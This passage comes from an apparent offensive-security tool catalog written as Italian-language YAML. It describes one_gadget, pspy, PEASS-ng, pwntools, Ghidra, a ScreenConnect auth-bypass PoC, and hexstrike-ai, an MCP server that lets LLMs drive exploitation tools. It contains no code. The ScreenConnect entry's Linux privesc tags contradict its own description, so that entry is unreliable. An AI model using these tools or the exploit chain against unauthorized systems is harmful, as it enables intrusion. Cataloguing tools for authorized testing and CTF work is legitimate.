  caps: ["libc-gadgets", "rce-primitives", "ctf"]
  repo: "https://github.com/david942j/one_gadget"
  desc: "Trova gadget RCE in libc.so.6 (one_gadget) via esecuzione simbolica; output
    offsets e vincoli d’uso."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>one_gadget è un tool Ruby che
    individua gadget in libc che portano a execve('/bin/sh',...). Fornisce offset
    pronti all'uso e i vincoli necessari, a partire dal file libc o dal BuildID.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Ricerca offset per i386/x86‑64/aarch64.</li><li>Input:
    file libc o BuildID; output raw/pretty/JSON.</li><li>Supporto a ordinamento per
    distanza da funzioni/GOT.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Utile
    in CTF e ricerca; mantenere mapping tra binari/libc per riproducibilità.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
  notes:

- id: "pspy"
  name: "pspy"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["process-snoop", "cron-watch", "no-root"]
  repo: "https://github.com/DominicBreuker/pspy"
  desc: "Monitor di processi Linux senza root per enumerare esecuzioni, cron e comandi
    utili a privesc."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>pspy consente di osservare processi,
    esecuzioni di cron/anacron e chiamate di binari senza privilegi elevati. È utile
    per identificare task pianificati, servizi e hook SUID/SUDO sfruttabili ai fini
    di escalation locale.</p><h4 class=\"rt-blue\">Funzioni chiave</h4><ul><li>Tracciamento
    di nuovi processi e argomenti in tempo reale.</li><li>Rilevazione di esecuzioni
    periodiche (cron, systemd timers) e di file eseguibili.</li><li>Binari statici
    disponibili per diverse architetture.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire
    dal path dell’utente per ridurre indicatori. Filtrare il rumore con pattern per
    isolare processi interessanti.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
  notes:

- id: "screen-exploit-poc"
  name: "screen-exploit-poc.sh"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["03_Post_Exploitation"]
  caps: ["screen-privesc", "local-exploit"]
  repo: ""
  desc: "PoC per auth‑bypass di ConnectWise ScreenConnect che consente creazione utente
    admin e RCE in catena."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Proof‑of‑Concept per la catena
    CVE‑2024‑1708/1709 su ScreenConnect: sfrutta un bypass di autenticazione per creare
    un amministratore, primo passo di una catena RCE documentata.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>Automazione della creazione utente amministrativo.</li><li>Compatibile
    con istanze on‑prem autogestite.</li><li>Base per verifiche di esposizione e remediation.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Da usare esclusivamente per validare sistemi
    propri/consentiti. Aggiornare immediatamente le istanze vulnerabili.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
  notes:

- id: "peass-ng"
  name: "PEASS-ng"
  version: "20250904-27f4363e"
  icon: "../app/icons/github.svg"
  kind: "toolkit"
  phases: ["03_Post_Exploitation"]
  caps: ["winpeas", "linpeas", "macpeas", "privesc-checks"]
  repo: "https://github.com/peass-ng/PEASS-ng"
  desc: "Suite per Privilege Escalation (winPEAS/linPEAS): enum locale con output
    a colori e parser in JSON/HTML."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>PEASS-ng fornisce script per
    enumerazione privesc su Windows e Linux, evidenziando misconfigurazioni e vettori.
    Include parser per trasformare gli output in report JSON/HTML/PDF.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>winPEAS e linPEAS con check estesi.</li><li>Raccolta
    artefatti e colori per priorità.</li><li>Parser per esportazioni strutturate.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire versioni aggiornate dai release
    ufficiali e limitare i check potenzialmente rumorosi.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Privilege_Escalation"]
  notes:

- id: "ghidra-11-4-2-public"
  name: "Ghidra"
  version: "11.4.2"
  icon: "../app/icons/github.svg"
  kind: "framework"
  phases: ["03_Post_Exploitation"]
  caps: ["disassembly", "decompiler", "scripting"]
  repo: "https://github.com/NationalSecurityAgency/ghidra"
  desc: "Suite SRE di reverse engineering: decompiler, disassembler, analisi bytecode,
    script e headless."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Ghidra è un framework SRE con
    disassembler, decompiler e strumenti per analisi statica/patching su molte architetture.
    Supporta scripting (Java/Python), project collaboration e modalità headless per
    batch.</p><h4 class=\"rt-blue\">Funzioni chiave</h4><ul><li>Decompiler ad alto
    livello con refactoring.</li><li>Supporto multi‑arch/piattaforma e import di formati
    eseguibili.</li><li>Integrazione di script, extensions e server collaborative.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Isolare i sample, usare progetti separati
    e versionare gli script di analisi.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Reverse_Engineering"]
  notes:

- id: "pwninit-3-3-1"
  name: "pwninit"
  version: "3.3.1"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["ctf-bootstrap", "libc-setup", "patch-elf"]
  repo: "https://github.com/io12/pwninit"
  desc: "Bootstrap per CTF/binary‑exploitation: patch ELF, scarica ld/libc, genera
    stub pwntools ‘solve.py’."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>pwninit automatizza l’allestimento
    di challenge binarie: applica patchelf, recupera ld e simboli debug della libc
    corretta e genera un template pwntools pronto per l’exploit.</p><h4 class=\"rt-blue\"\
    >Funzioni chiave</h4><ul><li>Riconoscimento automatico di bin, libc e ld.</li><li>Patch
    di RPATH/interpreter con patchelf.</li><li>Template personalizzabile per pwntools.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Usare in ambienti lab/CTF. Conservare gli
    artefatti originali separati da quelli patchati.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Reverse_Engineering"]
  notes:

- id: "pwntools-4-14-1"
  name: "pwntools"
  version: "4.14.1"
  icon: "../app/icons/github.svg"
  kind: "library"
  phases: ["03_Post_Exploitation"]
  caps: ["exploit-dev", "rop", "tube-io", "asm"]
  repo: "https://github.com/Gallopsled/pwntools"
  desc: "Libreria per CTF/exploit development in Python: manipola ELF, ROP, networking,
    tubi e processi."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>pwntools è un framework Python
    per sviluppare exploit e script da CTF. Offre primitive per interagire con processi/remote,
    costruire ROP, gestire ELF/simboli e semplificare IO (tubi, SSH).</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>ELF/ROP/ASM helpers e gadgets discovery.</li><li>API
    per connessioni locali/remote, SSH e tubes.</li><li>Utilità per packing/unpacking,
    cyclic, fmtstr, libcdb.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Orientato
    a laboratorio/ricerca; mantenere versioni note per riproducibilità dei write‑up.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Reverse_Engineering"]
  notes:

- id: "5ire-0-13-2-appimage"
  name: "5ire-0.13.2-x86_64.AppImage"
  version: "0.13.2"
  icon: "../app/icons/github.svg"
  kind: "app"
  phases: ["04_Miscellaneous"]
  caps: ["mcp-client", "rag-local", "providers", "appimage"]
  repo: "https://github.com/nanbingxyz/5ire"
  desc: "Client desktop MCP multiprovider (5ire): assistente AI con integrazione di
    server MCP, KB locale e tool."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>5ire è un client desktop cross‑platform
    che funge da assistente AI e MCP client. Supporta provider multipli, conoscenza
    locale e l’uso di server MCP per estendere le capacità del modello con strumenti.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Interfaccia unica per più modelli
    e server MCP.</li><li>Supporto a visione, strumenti e KB locali.</li><li>Distribuzione
    AppImage per esecuzione portabile su Linux.</li></ul><h4 class=\"rt-blue\">Uso
    e OPSEC</h4><p>Gestire API key in modo sicuro. Eseguire AppImage in sandbox (es.
    Firejail) quando richiesto dalle policy.</p>"
  best_in: false
  category_path: ["04_Miscellaneous"]
  notes:

- id: "hexstrike-ai"
  name: "hexstrike-ai"
  version: "6.0"
  icon: "../app/icons/github.svg"
  kind: "mcp-server"
  phases: ["04_Miscellaneous"]
  caps: ["ai-agents", "tool-orchestration", "automation", "pentest-framework"]
  repo: "https://github.com/0x4m4/hexstrike-ai"
  desc: "MCP server che collega LLM a 150+ tool offensivi per automazione di recon,
    scanning, exploit e reporting."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>HexStrike AI espone, via Model
    Context Protocol, un’orchestrazione multi‑agente che permette a modelli LLM di
    invocare strumenti reali per pentest e bug bounty. Integra decision engine, task
    queue e profili operativi.</p><h4 class=\"rt-blue\">Funzioni chiave</h4><ul><li>Integrazione
    con GPT/Claude/Copilot e oltre 150 tool.</li><li>Automazione di ricognizione,
    scansione, exploitation e analisi risultati.</li><li>Policy di sicurezza, sandboxing
    e logging delle azioni dell’agente.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Definire
    scope, limiti e approvazioni umane. Monitorare i comandi emessi dagli agenti e
    conservare i log per audit.</p>"
  best_in: false
  category_path: ["04_Miscellaneous"]
  notes:
